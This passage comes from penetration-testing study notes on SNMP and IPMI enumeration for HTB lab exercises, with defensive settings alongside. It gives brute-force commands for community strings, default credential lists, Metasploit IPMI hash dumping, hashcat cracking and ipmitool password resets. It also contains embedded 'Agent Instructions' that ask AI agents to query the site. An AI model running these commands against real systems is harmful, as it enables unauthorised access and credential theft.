+nc                   # Banner grabbing
+openssl              # SSL/TLS connection testing
+
+# Automated enumeration
+nmap                 # Service detection and scripts
+smtp-user-enum       # Can also test IMAP/POP3 in some cases
+```
+
+### Custom Scripts
+
+```bash wrap
+# IMAP banner grabber
+#!/bin/bash
+echo "CAPABILITY" | nc $1 143
+
+# POP3 banner grabber
+#!/bin/bash
+echo "CAPA" | nc $1 110
+
+# SSL certificate extractor
+#!/bin/bash
+openssl s_client -connect $1:993 2>/dev/null | openssl x509 -text | grep -E "Subject|Issuer"
+```
+
+## Defensive Measures
+
+### Secure Configuration
+
+```bash wrap
+# Disable plaintext authentication
+# In dovecot.conf:
+auth_mechanisms = plain login
+disable_plaintext_auth = yes
+
+# Force SSL/TLS
+ssl = required
+ssl_cert = </path/to/cert.pem
+ssl_key = </path/to/key.pem
+```
+
+### Best Practices
+
+1. **Enforce SSL/TLS**: Disable plaintext protocols
+2. **Strong Authentication**: Implement strong password policies
+3. **Rate Limiting**: Prevent brute force attacks
+4. **Monitoring**: Log authentication attempts
+5. **Certificate Management**: Use valid certificates
+
+### Detection and Monitoring
+
+```bash wrap
+# Monitor mail server logs
+tail -f /var/log/maillog
+
+# Check for authentication failures
+grep "authentication failure" /var/log/maillog
+grep "Login failed" /var/log/maillog
+```
+
+## Common Attack Vectors
+
+### 1. Credential Brute Force
+
+```bash wrap
+# Manual testing
+for user in admin root test; do
+    for pass in admin password 123456; do
+        # Test credentials
+    done
+done
+```
+
+### 2. Information Disclosure
+
+* Server version information
+* Internal network details
+* Email addresses and contacts
+* Organizational structure
+
+### 3. Man-in-the-Middle
+
+* Intercept plaintext connections
+* Certificate validation bypass
+* Credential harvesting
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/email-enumeration.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## SNMP Enumeration
+
+## Overview
+
+Simple Network Management Protocol (SNMP) is a network protocol used for monitoring and managing network devices. SNMP can reveal extensive information about network infrastructure, system configuration, and running processes, making it valuable for both administration and penetration testing.
+
+**Key Characteristics:**
+
+* **Port 161**: SNMP (UDP) - Queries and commands
+* **Port 162**: SNMP Traps (UDP) - Unsolicited notifications
+* **Versions**: SNMPv1, SNMPv2c, SNMPv3
+* **Authentication**: Community strings (v1/v2c), user-based (v3)
+* **Data Structure**: Management Information Base (MIB)
+
+**SNMP Communication:**
+
+* **Traditional**: Client actively requests information from server
+* **Traps**: Server sends data packets to client without explicit request
+* **Addressing**: Uses Object Identifiers (OIDs) for unique addressing
+
+## MIB (Management Information Base)
+
+MIB is an independent format for storing device information in a standardized tree hierarchy. It contains:
+
+* **Object Identifier (OID)**: Unique address for each object
+* **Name**: Human-readable identifier
+* **Type**: Data type specification
+* **Access Rights**: Read/write permissions
+* **Description**: Object functionality description
+
+**Key MIB Characteristics:**
+
+* Written in Abstract Syntax Notation One (ASN.1) format
+* ASCII text-based
+* Explains where to find information and data types
+* Does not contain actual data, only structure definitions
+
+## OID (Object Identifier)
+
+OIDs represent nodes in a hierarchical namespace using dot notation:
+
+* **Structure**: Sequence of numbers (e.g., 1.3.6.1.2.1.1.1.0)
+* **Hierarchy**: Longer chains = more specific information
+* **Universal**: Standardized across vendors and systems
+* **Registry**: Many OIDs documented in Object Identifier Registry
+
+## SNMP Versions
+
+| Version     | Security | Authentication   | Description                                                                      |
+| ----------- | -------- | ---------------- | -------------------------------------------------------------------------------- |
+| **SNMPv1**  | None     | Community string | Original version, no encryption, no built-in authentication                      |
+| **SNMPv2c** | None     | Community string | Improved performance, community-based, no encryption                             |
+| **SNMPv3**  | Yes      | User-based       | Username/password authentication, encryption via pre-shared key, high complexity |
+
+**Detailed Version Analysis:**
+
+* **SNMPv1**: First version, still used in small networks, supports information retrieval, device configuration, and traps, but lacks authentication and encryption
+* **SNMPv2c**: Extended version with additional functions, community string transmitted in plain text, no built-in encryption
+* **SNMPv3**: Significantly increased security with authentication and encryption, but also increased complexity requiring more configuration
+
+## Default Configuration
+
+The default SNMP daemon configuration defines basic settings including IP addresses, ports, MIB, OIDs, authentication, and community strings.
+
+### Example SNMP Daemon Config (`/etc/snmp/snmpd.conf`)
+
+```bash wrap
+# View SNMP daemon configuration
+cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
+
+# Example configuration:
+sysLocation    Sitting on the Dock of the Bay
+sysContact     Me <me@example.org>
+sysServices    72
+master  agentx
+agentaddress  127.0.0.1,[::1]
+view   systemonly  included   .1.3.6.1.2.1.1
+view   systemonly  included   .1.3.6.1.2.1.25.1
+rocommunity  public default -V systemonly
+rocommunity6 public default -V systemonly
+rouser authPrivUser authpriv -V systemonly
+```
+
+**Key Configuration Parameters:**
+
+* **sysLocation**: Physical location description
+* **sysContact**: Administrative contact (often contains email)
+* **sysServices**: Services provided by the entity
+* **agentaddress**: IP addresses and ports for SNMP agent
+* **rocommunity**: Read-only community string configuration
+* **rouser**: Read-only user configuration for SNMPv3
+
+## Dangerous Settings
+
+Some dangerous settings that administrators can configure with SNMP:
+
+| Setting                           | Description                                                   | Risk Level |
+| --------------------------------- | ------------------------------------------------------------- | ---------- |
+| `rwuser noauth`                   | Provides access to full OID tree without authentication       | Critical   |
+| `rwcommunity <community> <IPv4>`  | Provides access to full OID tree regardless of request source | Critical   |
+| `rwcommunity6 <community> <IPv6>` | Same as rwcommunity but for IPv6 addresses                    | Critical   |
+
+**High-Risk Configuration Examples:**
+
+```bash wrap
+# DANGEROUS: Write access without authentication
+rwuser noauth
+
+# DANGEROUS: Write access from any source
+rwcommunity public 0.0.0.0/0
+
+# DANGEROUS: IPv6 write access from any source  
+rwcommunity6 public ::/0
+```
+
+## Community Strings
+
+Community strings act as passwords that determine whether requested information can be viewed or not. They are transmitted in plain text, making them vulnerable to interception.
+
+**Key Issues with Community Strings:**
+
+* Lack of encryption in SNMPv1/v2c
+* Transmitted over network in plain text
+* Can be intercepted and read
+* Many organizations still use default values
+* Often bound to specific IP addresses but with predictable patterns
+
+### Common Default Community Strings
+
+```bash wrap
+# Read-only community strings
+public
+private
+community
+snmp
+read
+manager
+admin
+guest
+
+# Read-write community strings
+private
+write
+admin
+root
+```
+
+**Community String Patterns:**
+
+* Often named with hostname of the host
+* Sometimes include symbols to make identification harder
+* In large networks (100+ servers), labels follow patterns
+* Can be brute-forced using custom wordlists
+
+## Enumeration Techniques
+
+### 1. Service Detection
+
+```bash wrap
+# Nmap SNMP detection
+nmap -sU -p161 target
+
+# Comprehensive SNMP enumeration
+nmap -sU -p161 --script snmp-info,snmp-netstat,snmp-processes target
+```
+
+### 2. Community String Brute Force
+
+```bash wrap
+# Using onesixtyone for community string brute forcing
+onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt target
+
+# Custom community string list
+onesixtyone -c community_strings.txt target
+
+# Using snmpwalk to test community strings
+snmpwalk -v2c -c public target
+snmpwalk -v2c -c private target
+```
+
+### 3. SNMP Walking
+
+```bash wrap
+# Basic SNMP walk
+snmpwalk -v2c -c public target
+
+# Walk specific OID
+snmpwalk -v2c -c public target 1.3.6.1.2.1.1
+
+# Save output for analysis
+snmpwalk -v2c -c public target | tee snmp_output.txt
+```
+
+### 4. Specific Information Gathering
+
+```bash wrap
+# System information
+snmpwalk -v2c -c public target 1.3.6.1.2.1.1.1.0
+
+# Network interfaces
+snmpwalk -v2c -c public target 1.3.6.1.2.1.2.2.1.2
+
+# Process information
+snmpwalk -v2c -c public target 1.3.6.1.2.1.25.1.6.0
+
+# User accounts
+snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25
+```
+
+### 5. Using Braa for OID Brute Forcing
+
+```bash wrap
+# Install braa
+sudo apt install braa
+
+# Basic braa syntax
+braa <community_string>@<IP>:.1.3.6.*
+
+# Example usage
+braa public@target:.1.3.6.*
+
+# Braa example output
+target:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64
+target:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
+target:20ms:.1.3.6.1.2.1.1.3.0:548
+target:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
+target:20ms:.1.3.6.1.2.1.1.5.0:htb
+target:20ms:.1.3.6.1.2.1.1.6.0:US
+target:20ms:.1.3.6.1.2.1.1.7.0:78
+```
+
+### 6. Detailed SNMP Walking with Real Output
+
+```bash wrap
+# Complete SNMP walk example
+snmpwalk -v2c -c public target
+
+# Example detailed output analysis:
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64"
+iso.3.6.1.2.1.1.4.0 = STRING: "mrb3n@inlanefreight.htb"
+iso.3.6.1.2.1.1.5.0 = STRING: "htb"
+iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+
+# Extract Python packages (software enumeration):
+iso.3.6.1.2.1.25.6.3.1.2.1232 = STRING: "printer-driver-sag-gdi_0.1-7_all"
+iso.3.6.1.2.1.25.6.3.1.2.1233 = STRING: "printer-driver-splix_2.0.0+svn315-7fakesync1build1_amd64"
+iso.3.6.1.2.1.25.6.3.1.2.1234 = STRING: "procps_2:3.3.16-1ubuntu2.3_amd64"
+iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: "proftpd-basic_1.3.6c-2_amd64"
+iso.3.6.1.2.1.25.6.3.1.2.1236 = STRING: "proftpd-doc_1.3.6c-2_all"
+iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: "python3_3.8.2-0ubuntu2_amd64"
+iso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: "python3-acme_1.1.0-1_all"
+iso.3.6.1.2.1.25.6.3.1.2.1245 = STRING: "python3-apport_2.20.11-0ubuntu27.21_all"
+```
+
+## Important OIDs (Object Identifiers)
+
+### System Information OIDs
+
+```bash wrap
+# System description
+1.3.6.1.2.1.1.1.0
+
+# System contact (admin email)
+1.3.6.1.2.1.1.4.0
+
+# System name
+1.3.6.1.2.1.1.5.0
+
+# System location
+1.3.6.1.2.1.1.6.0
+
+# System uptime
+1.3.6.1.2.1.1.3.0
+```
+
+### Network Information OIDs
+
+```bash wrap
+# Network interfaces
+1.3.6.1.2.1.2.2.1.2
+
+# IP addresses
+1.3.6.1.2.1.4.20.1.1
+
+# Routing table
+1.3.6.1.2.1.4.21.1.1
+
+# ARP table
+1.3.6.1.2.1.4.22.1.2
+```
+
+### Process and Service OIDs
+
+```bash wrap
+# Running processes
+1.3.6.1.2.1.25.1.6.0
+
+# Process table
+1.3.6.1.2.1.25.4.2.1.2
+
+# Service information
+1.3.6.1.2.1.25.1.7.1.2
+
+# Software installed
+1.3.6.1.2.1.25.6.3.1.2
+```
+
+## Advanced Enumeration
+
+### Using Nmap NSE Scripts
+
+```bash wrap
+# Comprehensive SNMP enumeration
+nmap -sU -p161 --script snmp-info,snmp-netstat,snmp-processes,snmp-sysdescr target
+
+# SNMP brute force community strings
+nmap -sU -p161 --script snmp-brute target
+
+# SNMP interface information
+nmap -sU -p161 --script snmp-interfaces target
+
+# SNMP system information
+nmap -sU -p161 --script snmp-system-info target
+```
+
+### Custom OID Queries
+
+```bash wrap
+# Query specific OID
+snmpget -v2c -c public target 1.3.6.1.2.1.1.4.0
+
+# Query multiple OIDs
+snmpget -v2c -c public target 1.3.6.1.2.1.1.1.0 1.3.6.1.2.1.1.4.0
+
+# Walk specific branch
+snmpwalk -v2c -c public target 1.3.6.1.2.1.25.1.7
+```
+
+## Information Extraction
+
+### System Administrator Contact
+
+```bash wrap
+# Extract admin email from system contact
+snmpwalk -v2c -c public target 1.3.6.1.2.1.1.4.0
+
+# Example output analysis:
+# iso.3.6.1.2.1.1.4.0 = STRING: "devadmin <devadmin@inlanefreight.htb>"
+# Admin email: devadmin@inlanefreight.htb
+```
+
+### Custom Version Information
+
+```bash wrap
+# Extract custom SNMP version
+snmpwalk -v2c -c public target 1.3.6.1.2.1.1.6.0
+
+# Example output:
+# iso.3.6.1.2.1.1.6.0 = STRING: "InFreight SNMP v0.91"
+```
+
+### Running Processes and Scripts
+
+```bash wrap
+# Extract custom scripts and processes
+snmpwalk -v2c -c public target 1.3.6.1.2.1.25.1.7.1.2
+
+# Look for custom scripts like:
+# iso.3.6.1.2.1.25.1.7.1.2.1.2.4.70.76.65.71 = STRING: "/usr/share/flag.sh"
+```
+
+## Practical Examples
+
+### HTB Academy Style Enumeration
+
+```bash wrap
+# Step 1: Community string brute force
+onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt target
+# Result: Found community string "backup"
+
+# Step 2: SNMP walking with found community string
+snmpwalk -v2c -c backup target
+
+# Step 3: Extract admin email
+snmpwalk -v2c -c backup target | grep -i "@"
+# Result: devadmin@inlanefreight.htb
+
+# Step 4: Extract custom version
+snmpwalk -v2c -c backup target | grep -i "version"
+# Result: InFreight SNMP v0.91
+
+# Step 5: Look for custom scripts and flags
+snmpwalk -v2c -c backup target | grep -i "htb\|flag"
+# Result: HTB{...}
+```
+
+### HTB Academy Lab Questions Examples
+
+```bash wrap
+# Question 1: "Enumerate the SNMP service and obtain the email address of the admin"
+# Step 1: Find valid community string
+onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt target
+# Step 2: Extract admin contact
+snmpwalk -v2c -c found_community target 1.3.6.1.2.1.1.4.0
+# Look for: iso.3.6.1.2.1.1.4.0 = STRING: "admin <admin@inlanefreight.htb>"
+# Answer: admin@inlanefreight.htb
+
+# Question 2: "What is the customized version of the SNMP server?"
+# Extract from system location or custom OID
+snmpwalk -v2c -c found_community target 1.3.6.1.2.1.1.6.0
+# Look for: iso.3.6.1.2.1.1.6.0 = STRING: "InFreight SNMP v0.91"
+# Answer: InFreight SNMP v0.91
+
+# Question 3: "Enumerate the custom script that is running on the system"
+# Look for custom scripts in process/service OIDs
+snmpwalk -v2c -c found_community target 1.3.6.1.2.1.25.1.7.1.2
+# Look for custom script paths like:
+# iso.3.6.1.2.1.25.1.7.1.2.1.2.4.70.76.65.71 = STRING: "/usr/share/flag.sh"
+# Execute or analyze the script output
+# Answer: Script output or HTB{...} flag
+```
+
+### Real Output Analysis from HTB Academy
+
+```bash wrap
+# Example misconfigured SNMP server output
+snmpwalk -v2c -c public target
+
+# Key information to extract:
+# 1. System contact (admin email):
+iso.3.6.1.2.1.1.4.0 = STRING: "mrb3n@inlanefreight.htb"
+
+# 2. Installed packages (reconnaissance):
+iso.3.6.1.2.1.25.6.3.1.2.1235 = STRING: "proftpd-basic_1.3.6c-2_amd64"
+
+# 3. System information:
+iso.3.6.1.2.1.1.1.0 = STRING: "Linux htb 5.11.0-34-generic"
+
+# 4. Network interfaces and configuration details
+
+# This information reveals:
+# - Admin contact: mrb3n@inlanefreight.htb
+# - ProFTPD installed (potential attack vector)
+# - Linux system details
+# - Network configuration
+```
+
+### Information Parsing
+
+```bash wrap
+# Parse SNMP output for specific information
+snmpwalk -v2c -c public target > snmp_full.txt
+
+# Extract email addresses
+grep -i "@" snmp_full.txt
+
+# Extract IP addresses
+grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' snmp_full.txt
+
+# Extract file paths
+grep -oE '"/[^"]*"' snmp_full.txt
+
+# Extract process information
+grep -i "process\|service" snmp_full.txt
+```
+
+## Security Assessment
+
+### Common Vulnerabilities
+
+1. **Default Community Strings**: Using default "public" or "private"
+2. **Information Disclosure**: Excessive information exposure
+3. **Weak Community Strings**: Easily guessable strings
+4. **SNMPv1/v2c Usage**: Unencrypted protocols
+5. **Write Access**: Unauthorized configuration changes
+
+### Community String Testing
+
+```bash wrap
+# Test common community strings
+for community in public private community snmp read manager admin; do
+    echo "Testing: $community"
+    snmpwalk -v2c -c $community target 1.3.6.1.2.1.1.1.0
+done
+```
+
+## Enumeration Checklist
+
+### Initial Discovery
+
+* [ ] Port scan for 161/UDP
+* [ ] Service version detection
+* [ ] SNMP version identification
+* [ ] Community string brute force
+
+### Information Gathering
+
+* [ ] System information extraction
+* [ ] Network interface enumeration
+* [ ] Process and service discovery
+* [ ] User account identification
+
+### Detailed Analysis
+
+* [ ] Custom script identification
+* [ ] Configuration file discovery
+* [ ] Credential extraction
+* [ ] Network topology mapping
+
+### Security Testing
+
+* [ ] Write access testing
+* [ ] Information disclosure assessment
+* [ ] Weak community string identification
+* [ ] Encryption status verification
+
+## Tools and Techniques
+
+### Essential SNMP Tools
+
+```bash wrap
+# Basic tools
+snmpwalk             # SNMP tree walking
+snmpget              # Specific OID queries
+snmpset              # SNMP value setting (if write access)
+
+# Enumeration tools
+onesixtyone          # Community string brute forcing
+braa                 # OID brute forcing and fast SNMP scanner
+snmp-check           # Comprehensive SNMP enumeration
+nmap                 # NSE script-based enumeration
+
+# Analysis tools
+snmptranslate        # OID translation
+snmpnetstat          # Network statistics via SNMP
+```
+
+### Tool Installation and Usage
+
+```bash wrap
+# Install SNMP tools
+sudo apt install snmp snmp-mibs-downloader
+
+# Install onesixtyone
+sudo apt install onesixtyone
+
+# Install braa
+sudo apt install braa
+
+# Download MIBs
+sudo download-mibs
+
+# Tool comparison:
+# - snmpwalk: Comprehensive but slower
+# - onesixtyone: Fast community string discovery
+# - braa: Fast OID enumeration and bulk queries
+# - nmap: Integrated with other reconnaissance
+```
+
+### Custom Scripts
+
+```bash wrap
+# SNMP community string tester
+#!/bin/bash
+target=$1
+wordlist=$2
+
+while read community; do
+    result=$(snmpwalk -v2c -c $community $target 1.3.6.1.2.1.1.1.0 2>/dev/null)
+    if [ $? -eq 0 ]; then
+        echo "Found valid community: $community"
+    fi
+done < $wordlist
+
+# SNMP information extractor
+#!/bin/bash
+target=$1
+community=$2
+
+echo "System Information:"
+snmpwalk -v2c -c $community $target 1.3.6.1.2.1.1
+
+echo "Network Interfaces:"
+snmpwalk -v2c -c $community $target 1.3.6.1.2.1.2.2.1.2
+
+echo "Process Information:"
+snmpwalk -v2c -c $community $target 1.3.6.1.2.1.25.1.6.0
+```
+
+## Defensive Measures
+
+### Secure SNMP Configuration
+
+```bash wrap
+# Disable SNMP if not needed
+systemctl stop snmpd
+systemctl disable snmpd
+
+# Configure SNMPv3 with authentication
+# In /etc/snmp/snmpd.conf:
+createUser myuser MD5 mypassword DES
+rouser myuser
+
+# Disable SNMPv1/v2c
+# Remove community string configurations
+```
+
+### Best Practices
+
+1. **Use SNMPv3**: Implement encryption and authentication
+2. **Strong Community Strings**: Use complex, unique strings
+3. **Access Controls**: Limit SNMP access by IP/network
+4. **Minimal Exposure**: Only expose necessary information
+5. **Regular Audits**: Monitor SNMP access and configuration
+
+### Detection and Monitoring
+
+```bash wrap
+# Monitor SNMP access
+tcpdump -i any port 161
+
+# Check SNMP logs
+tail -f /var/log/snmpd.log
+
+# Analyze unusual SNMP queries
+grep "snmp" /var/log/syslog
+```
+
+## Common Attack Vectors
+
+### 1. Information Gathering
+
+* Network topology discovery
+* System configuration extraction
+* User account enumeration
+* Process and service identification
+
+### 2. Credential Harvesting
+
+* Extract stored passwords
+* Identify service accounts
+* Discover configuration files
+* Find backup credentials
+
+### 3. Network Reconnaissance
+
+* ARP table analysis
+* Routing table examination
+* Interface configuration review
+* Network device identification
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/network-services/snmp-enumeration.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## IPMI Enumeration
+
+## Overview
+
+IPMI (Intelligent Platform Management Interface) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. IPMI can be used to manage a server or network device before the OS is installed, during OS runtime, or even when the system is powered off.
+
+**Key Characteristics:**
+
+* **Port 623**: IPMI over UDP
+* **Purpose**: Remote system management, monitoring, and control
+* **Independence**: Functions independently of the main OS
+* **Access**: Direct hardware-level access to systems
+* **Authentication**: Username/password based with various privilege levels
+
+## IPMI Components
+
+### BMC (Baseboard Management Controller)
+
+* **Function**: Microprocessor that monitors the server
+* **Independence**: Operates independently of the main CPU and OS
+* **Power**: Continuously powered (even when server is off)
+* **Access**: Provides hardware access to system components
+* **Communication**: Interfaces with various system sensors and components
+
+### Management Console
+
+* **Purpose**: Interface for administrators to interact with IPMI
+* **Access Methods**: Web interface, command-line tools, SNMP
+* **Functionality**: System monitoring, power management, configuration
+* **Remote Access**: Allows remote management of systems
+
+### IPMI Protocol Stack
+
+| Layer                 | Description                           |
+| --------------------- | ------------------------------------- |
+| **Application Layer** | Commands and responses                |
+| **Session Layer**     | Authentication and session management |
+| **Message Layer**     | Message formatting and routing        |
+| **Transport Layer**   | UDP/TCP communication                 |
+
+## IPMI Versions and Authentication
+
+### IPMI Version Comparison
+
+| Version      | Authentication | Encryption     | Security Features                           |
+| ------------ | -------------- | -------------- | ------------------------------------------- |
+| **IPMI 1.5** | MD5 hash       | None           | Basic authentication, no encryption         |
+| **IPMI 2.0** | HMAC-based     | AES encryption | Enhanced authentication, encrypted sessions |
+
+### Authentication Types
+
+* **None**: No authentication required
+* **MD2**: MD2 hash-based authentication
+* **MD5**: MD5 hash-based authentication
+* **Straight Password**: Plain text password
+* **OEM**: Vendor-specific authentication
+
+## IPMI Privilege Levels
+
+| Level             | Description       | Capabilities                       |
+| ----------------- | ----------------- | ---------------------------------- |
+| **Callback**      | Lowest privilege  | Basic system information           |
+| **User**          | Standard user     | System monitoring, some control    |
+| **Operator**      | Operator level    | Power management, system control   |
+| **Administrator** | Highest privilege | Full system control, configuration |
+| **OEM**           | Vendor-specific   | Custom vendor functions            |
+
+## Default Configuration Issues
+
+### Common Misconfigurations
+
+1. **Default Credentials**: Many systems ship with default usernames/passwords
+2. **Weak Passwords**: Simple or commonly known passwords
+3. **Network Exposure**: IPMI accessible from external networks
+4. **No Authentication**: Anonymous access enabled
+5. **Version Vulnerabilities**: Using vulnerable IPMI versions
+
+### Common Default Credentials
+
+```bash wrap
+# Common default IPMI credentials
+admin:admin
+root:root
+admin:password
+ADMIN:ADMIN
+root:calvin
+user:user
+```
+
+## Dangerous Settings
+
+| Setting                | Description                                 | Risk Level |
+| ---------------------- | ------------------------------------------- | ---------- |
+| **Anonymous Access**   | No authentication required                  | Critical   |
+| **Default Passwords**  | Factory default credentials                 | High       |
+| **Network Accessible** | IPMI accessible from WAN                    | High       |
+| **IPMI 1.5**           | Vulnerable version with weak authentication | Medium     |
+| **Null Username**      | Empty username accepted                     | High       |
+
+## Enumeration Techniques
+
+### 1. Service Detection
+
+```bash wrap
+# Nmap IPMI detection
+nmap -sU -p623 target
+
+# Comprehensive IPMI enumeration
+nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero target
+
+# Multiple target scan
+nmap -sU -p623 --script ipmi-version target_network/24
+```
+
+### 2. IPMI Version Detection
+
+```bash wrap
+# Basic version detection
+nmap -sU -p623 --script ipmi-version target
+
+# Example output analysis:
+# 623/udp open  asf-rmcp
+# | ipmi-version: 
+# |   Version: 
+# |     IPMI-2.0
+# |   UserAuth: 
+# |     CALLBACK, USER, OPERATOR, ADMINISTRATOR, OEM
+# |   PassAuth: 
+# |     CALLBACK, USER, OPERATOR, ADMINISTRATOR, OEM
+# |_  Level: 2.0
+```
+
+### 3. Authentication Testing
+
+```bash wrap
+# Test for cipher zero vulnerability (IPMI 2.0)
+nmap -sU -p623 --script ipmi-cipher-zero target
+
+# Example vulnerable output:
+# | ipmi-cipher-zero: 
+# |   VULNERABLE:
+# |   IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval
+# |     State: VULNERABLE
+# |     Risk factor: High
+# |     Authentication bypassed via authentication type 'cipher zero'
+```
+
+### 4. Default Credential Testing
+
+```bash wrap
+# Manual testing with ipmitool
+ipmitool -I lanplus -H target -U admin -P admin user list
+
+# Test common credentials
+ipmitool -I lanplus -H target -U root -P root chassis status
+ipmitool -I lanplus -H target -U admin -P password sdr list
+```
+
+## Advanced Enumeration
+
+### Using ipmitool
+
+```bash wrap
+# Basic IPMI connection test
+ipmitool -I lanplus -H target -U username -P password chassis status
+
+# List users
+ipmitool -I lanplus -H target -U username -P password user list
+
+# Get system information
+ipmitool -I lanplus -H target -U username -P password fru list
+ipmitool -I lanplus -H target -U username -P password sdr list
+
+# Power management
+ipmitool -I lanplus -H target -U username -P password power status
+```
+
+### Using Metasploit
+
+```bash wrap
+# IPMI version scan
+use auxiliary/scanner/ipmi/ipmi_version
+set RHOSTS target
+run
+
+# IPMI dumphashes (for cipher zero vulnerability)
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set RHOSTS target
+set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
+run
+
+# IPMI cipher zero
+use auxiliary/scanner/ipmi/ipmi_cipher_zero
+set RHOSTS target
+run
+```
+
+### Hash Extraction and Cracking
+
+```bash wrap
+# Extract hashes using ipmi_dumphashes
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set RHOSTS target
+set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
+run
+
+# Crack hashes with hashcat
+hashcat -m 7300 ipmi_hashes.txt wordlist.txt
+
+# Example hash format:
+# admin:8140000089eb9c5f41b4e0632b85f1e1e6e9a7b0:f2b4f8c7b4c4b4c4:2:admin:admin
+```
+
+## Vulnerability Assessment
+
+### IPMI 2.0 RAKP Authentication Bypass
+
+```bash wrap
+# Test for RAKP vulnerability
+nmap -sU -p623 --script ipmi-cipher-zero target
+
+# If vulnerable, extract password hashes
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set RHOSTS target
+run
+
+# Hash cracking
+hashcat -m 7300 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+### Common IPMI Vulnerabilities
+
+1. **CVE-2013-4786**: IPMI 2.0 RAKP authentication bypass
+2. **Default Credentials**: Factory default passwords
+3. **Weak Authentication**: Insufficient authentication mechanisms
+4. **Network Exposure**: IPMI accessible from untrusted networks
+
+## Practical Examples
+
+### HTB Academy Style Enumeration
+
+```bash wrap
+# Step 1: Service detection
+nmap -sU -p623 --script ipmi-version target
+
+# Step 2: Check for cipher zero vulnerability
+nmap -sU -p623 --script ipmi-cipher-zero target
+
+# Step 3: Extract hashes if vulnerable
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set RHOSTS target
+run
+
+# Step 4: Crack extracted hashes
+hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Step 5: Access system with cracked credentials
+ipmitool -I lanplus -H target -U admin -P cracked_password chassis status
+```
+
+### HTB Academy Lab Questions Examples
+
+```bash wrap
+# Question 1: "What is the IPMI version running on the remote host?"
+nmap -sU -p623 --script ipmi-version target
+# Look for: IPMI-2.0
+# Answer: 2.0
+
+# Question 2: "What is the default username configured?"
+# After gaining access:
+ipmitool -I lanplus -H target -U admin -P admin user list
+# Look for: admin (User ID: 2)
+# Answer: admin
+
+# Question 3: "Extract and crack the administrator password hash"
+# Use Metasploit to extract hashes
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set RHOSTS target
+run
+# Crack with hashcat
+hashcat -m 7300 hash.txt wordlist.txt
+# Answer: cracked_password
+```
+
+### Real-World Scenario
+
+```bash wrap
+# Complete IPMI enumeration workflow
+# 1. Discovery
+nmap -sU -p623 --script ipmi-version target_network/24
+
+# 2. Vulnerability assessment
+nmap -sU -p623 --script ipmi-cipher-zero target
+
+# 3. Hash extraction
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set RHOSTS target
+set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
+run
+
+# 4. Hash cracking
+hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# 5. Access verification
+ipmitool -I lanplus -H target -U admin -P cracked_password chassis status
+
+# 6. System reconnaissance
+ipmitool -I lanplus -H target -U admin -P cracked_password fru list
+ipmitool -I lanplus -H target -U admin -P cracked_password sdr list
+ipmitool -I lanplus -H target -U admin -P cracked_password user list
+```
+
+## Information Gathering
+
+### System Information
+
+```bash wrap
+# Hardware information
+ipmitool -I lanplus -H target -U user -P pass fru list
+
+# Sensor data
+ipmitool -I lanplus -H target -U user -P pass sdr list
+
+# System event log
+ipmitool -I lanplus -H target -U user -P pass sel list
+
+# Network configuration
+ipmitool -I lanplus -H target -U user -P pass lan print
+```
+
+### User Management
+
+```bash wrap
+# List users
+ipmitool -I lanplus -H target -U admin -P pass user list
+
+# Set user password
+ipmitool -I lanplus -H target -U admin -P pass user set password 2 newpassword
+
+# Set user privileges
+ipmitool -I lanplus -H target -U admin -P pass user priv 2 4
+```
+
+## Attack Vectors
+
+### 1. Password Hash Extraction
+
+```bash wrap
